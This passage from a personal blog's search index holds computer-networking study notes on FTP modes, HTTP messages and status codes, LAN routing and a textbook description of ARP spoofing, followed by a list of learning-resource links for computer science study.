layer of the TCP model, i.e., the application layer, using<strong>TCP transmission instead of UDP</strong>. Clients must gothrough a “three-way handshake” process before establishing a connectionwith the server, ensuring that the connection between client and serveris reliable, and it’s connection-oriented, providing reliable guaranteefor data transmission. FTP allows users to communicate with another hostthrough file operations (such as file addition, deletion, modification,query, transfer, etc.). However, users don’t actually log into thecomputer they want to access to become full users. FTP programs can beused to access remote resources, implement user round-trip filetransfer, directory management, and email access, etc., even if bothcomputers may have different operating systems and file storage methods.### Transmission Methods FTP has two transmission methods: ASCII andbinary. #### ASCII Transmission Method Assuming the file being copiedcontains simple ASCII text, if the remote machine is not running UNIX,ftp usually automatically adjusts the file content during file transferto interpret the file in the format that the other computer stores textfiles. But often there are cases where the file being transmitteddoesn’t contain text files, they might be programs, databases, wordprocessing files, or compressed files. Before copying any non-textfiles, use the binary command to tell ftp to copy character bycharacter. #### Binary Transmission Mode In binary transmission, the bitorder of the file is preserved so that the original and copy arebit-by-bit corresponding. Even if the file containing the bit sequenceon the destination machine is meaningless. For example, Macintoshtransmits executable files to Windows systems in binary mode, and thisfile cannot be executed on the other system. If binary files aretransmitted in ASCII mode, translation will still occur even if notneeded. This will corrupt data. (ASCII mode generally assumes the firstsignificant bit of each character is meaningless because ASCII charactercombinations don’t use it. If transmitting binary files, all bits areimportant.)</p><h3 id="ftp-supports-two-modes">FTP Supports Two Modes</h3><p>FTP client initiates FTP session and establishes correspondingconnection with FTP server. During FTP session, two connections need tobe established: control information process and data process. Controlconnection cannot complete data transmission tasks, only used totransmit internal commands executed by FTP and command responses andother control information; data connection is the connection for filetransmission between server and client, it’s full-duplex, allowingsimultaneous bidirectional data transmission. When data transmission iscomplete, the data connection is revoked, returning to FTP session stateuntil the control connection is revoked and the session exits. FTPsupports two modes: Standard (PORT mode, active mode), Passive (PASV,passive mode). #### Port Mode (Active Mode) FTP client first establishesconnection with server’s TCP port 21 for sending commands. When theclient needs to receive data, it sends PORT command on this channel.PORT command contains which port the client uses to receive data. Whentransmitting data, the server connects to the client’s specified portthrough its own TCP port 20 to send data. FTP server must establish anew connection with the client for data transmission. #### Passive ModeControl channel establishment is similar to Standard mode, but sendsPasv command after establishing connection. After the server receivesthe Pasv command, it opens a temporary port (port number greater than1023 and less than 65535) and notifies the client of the request totransmit data on this port. The client connects to this port of the FTPserver, then the FTP server transmits data through this port.</p><h4 id="note">Note</h4><p>Many firewalls are configured to not allow external connections, somany FTP servers behind firewalls or on internal networks don’t supportPASV mode because clients cannot open high ports of FTP servers throughfirewalls; while many internal network clients cannot use PORT mode tolog into FTP servers because TCP 20 from the server cannot establish anew connection with clients on the internal network, causing it to notwork. ## HTTP Hyper Text Transfer Protocol (HTTP) is a simplerequest-response protocol that usually runs on top of TCP. Request andresponse message headers are given in ASCII form. ### ApplicationScenarios When HTTP was first born, it was mainly used for WEB contentretrieval. At that time, content wasn’t as rich as it is now, layoutwasn’t as beautiful, and user interaction scenarios were almostnon-existent. For this simple scenario of retrieving web content, HTTPperformed quite well. But with the development of the internet and thebirth of WEB2.0, more content began to be displayed (more image files),layout became more beautiful (more CSS), and more complex interactionswere introduced (more JS). The total amount of data loaded and thenumber of requests when users open a website homepage are alsoconstantly increasing. ### Message Format HTTP messages consist ofrequests from client to server and responses from server to client.</p><h4 id="request-message">Request Message</h4><p>Request message format is as follows:</p><p>Request line - General information header - Request header - Entityheader - Message body</p><p>Request line starts with method field, followed by URL field and HTTPprotocol version field, ending with CRLF. SP is the separator. Exceptfor CF and LF being required in the final CRLF sequence, others areoptional. For specific content about general information headers,request headers, and entity headers, refer to related documents.</p><h4 id="response-message">Response Message</h4><p>Response message format is as follows:</p><p>Status line - General information header - Response header - Entityheader - Message body</p><p>Status code consists of 3 digits, indicating whether the request wasunderstood or satisfied. Reason analysis is a brief description of theoriginal status code. Status codes are used to support automaticoperations, while reason analysis is for user use. Clients don’t need tocheck or display syntax. For specific content about general informationheaders, response headers, and entity headers, refer to relateddocuments.</p><p><strong><ahref="https://blog.csdn.net/m0_45861545/article/details/120835738">DetailedHTTP Message Explanation Click Here</a></strong> ### Status Codes Afterthe server receives an HTTP request, it sends response information tothe client, placed in the first line. The most important part is thestatus code</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br></pre></td></tr></table></figure><h4 id="status-code-types---first-digit">Status Code Types - FirstDigit</h4><ul><li>1**: Request successfully received, continue processing; range100~101</li><li>2**: Server successfully processed request; range 200~206</li><li>3**: Accessed resource was moved, inform client to resend newrequest; range 300~305</li><li>4**: Client error, server cannot process request, such as accessedresource doesn’t exist; range 400~415</li><li>5**: Server error; range 500~505</li></ul><h4 id="common-http-status-codes">Common HTTP Status Codes</h4><ul><li>200: Client request successful (common)</li><li>302: Redirect</li><li>404: Requested resource doesn’t exist (common)</li><li>400: Client request syntax error, cannot be understood byserver</li><li>401: Access unauthorized</li><li>403: Server received request but refused service</li><li>500: Server internal error (common)</li><li>503: Server currently cannot process, may be able to after sometime</li></ul><p>For specific details, see “<strong>Illustrated HTTP</strong>”</p><h1 id="communication">Communication</h1><h2 id="internal-network-communication-local-area-network">InternalNetwork Communication (Local Area Network)</h2><h3 id="ethernet">Ethernet</h3><p>Ethernet is a computer <strong>local area network</strong>technology.</p><h3 id="internal-network-communication-process">Internal NetworkCommunication Process</h3><p>The internal network mentioned here generally refers to Local AreaNetwork (LAN). When we say two terminals are in the same internalnetwork, it essentially means the network numbers of the two terminalsare the same. If two terminals are in the same internal network, theircommunication method is as follows</p><figure><imgsrc="https://pic3.zhimg.com/80/v2-28645c18e711eac7b6a3262f94556ecc_1440w.png"alt="image" /><figcaption aria-hidden="true">image</figcaption></figure><h3 id="arp-introduction">ARP Introduction</h3><h4 id="arp-protocol">ARP Protocol</h4><p>Address Resolution Protocol (ARP) is a TCP/IP protocol for obtainingphysical addresses based on IP addresses. When a host sends information,it broadcasts ARP requests containing the target IP address to all hostson the local area network and receives return messages to determine thetarget’s physical address; after receiving return messages, it storesthe IP address and physical address in the local ARP cache and retainsthem for a certain time, directly querying the <strong>ARPcache</strong> for the next request to save resources. AddressResolution Protocol is based on mutual trust between hosts in thenetwork. Hosts on the local area network can autonomously send ARP replymessages, and other hosts will record them in the local ARP cachewithout detecting the authenticity of the reply messages when received;thus attackers can send fake ARP reply messages to a certain host,making the information sent unable to reach the expected host or reachthe wrong host, constituting ARP spoofing. ARP commands can be used toquery the correspondence between IP addresses and MAC addresses in thelocal ARP cache, add or delete static correspondences, etc. Relatedprotocols include RARP and proxy ARP. NDP is used to replace AddressResolution Protocol in IPv6.</p><h4 id="arp-spoofing">ARP Spoofing</h4><p>ARP spoofing, also known as ARP poisoning (often translated as ARPvirus on the network) or ARP attack, is an attack technique targetingthe Ethernet Address Resolution Protocol (ARP). By spoofing the gatewayMAC address of visitor PCs in the local area network, it makes visitorPCs mistakenly think that the attacker’s changed MAC address is thegateway’s MAC, causing network failure. This attack allows attackers toobtain data packets on the local area network and even tamper with datapackets, and can make specific computers or all computers on the networkunable to connect normally.</p><h4 id="free-arp">Free ARP</h4><ol type="1"><li>Check for address conflicts</li><li>Update own ARP cache</li></ol><h2 id="internet-communication-process">Internet CommunicationProcess</h2><p>If the host is on the Internet, the target address and source addressare not in the same internal network, meaning the network number partsof their IP addresses are not consistent. At this time, data packetsneed to be sent to the “default gateway” for routing. The specificcommunication process is as follows:</p><figure><imgsrc="https://pic4.zhimg.com/80/v2-5188517210eac6afb96e4046cbbe65c6_1440w.png"alt="image" /><figcaption aria-hidden="true">image</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Tools &amp; Workflow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study </tag>
            
            <tag> Computer Networks </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>useful_links</title>
      <link href="/2022/05/25/Blog/useful-links/"/>
      <url>/2022/05/25/Blog/useful-links/</url>
      
        <content type="html"><![CDATA[<p>Book Resources: https://github.com/frankcbliu/CS-Books-PDF</p><p>Algorithm Knowledge Explanation: https://oi-wiki.org/graph/</p><p>CS Self-Study Guide: https://csdiy.wiki</p><p>XuetangX (similar to MOOC course website):</p><p>https://www.xuetangx.com (Highly recommend Tsinghua UniversityProfessor Zheng Li’s C++ Programming course)</p><span id="more"></span><p>Computer Practical Technology (XuetangX):https://www.xuetangx.com/learn/THUSAST08091234567890/THUSAST08091234567890/8571842/video/13167559</p><p>Data Structures by Deng Junhui (XuetangX):https://www.xuetangx.com/learn/THU08091000384/THU08091000384/10322765/video/17436706?channel=i.area.manual_search</p><p>Online Code Learning Websites:</p><p>https://www.freecodecamp.org/ https://www.codecademy.com/learn</p><p>Tsinghua University Graduate Entrance Exam Materials:https://github.com/Wsky51/THU-CS912-kaoyan</p><p>GitHub Configuration Hexo Personal Blog Setup:https://zhuanlan.zhihu.com/p/60578464https://zhuanlan.zhihu.com/p/36912355?utm_source=wechat_session&amp;utm_medium=social&amp;s_r=0</p><p>Tsinghua Senior OOP Notes https://c7w.tech/oop-note/</p><p>Tsinghua Senior Notes:https://cloud.tsinghua.edu.cn/d/598bef9e3b844f17bf59/</p><p>Linux Learning Notes: https://zq99299.github.io/linux-tutorial/</p><p>Vim Editor Configuration Plugins:</p><p>MIT Vim Lecture: https://missing.csail.mit.edu/2020/editors/(Contains teacher’s configuration)</p><p>Plugin Search Website: https://vimawesome.com</p><p>Super Powerful Vim Configuration (vimplus) - Sequel:https://www.cnblogs.com/highway-9/p/5984285.html</p><p>iTerm2 + zsh + oh-my-zsh Beautification:</p><p>Tutorial: https://zhuanlan.zhihu.com/p/145437836</p><p>Icons: https://www.nerdfonts.com/cheat-sheet</p>]]></content>
      
      
      <categories>
          
          <category> Learning Resources </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Learning </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
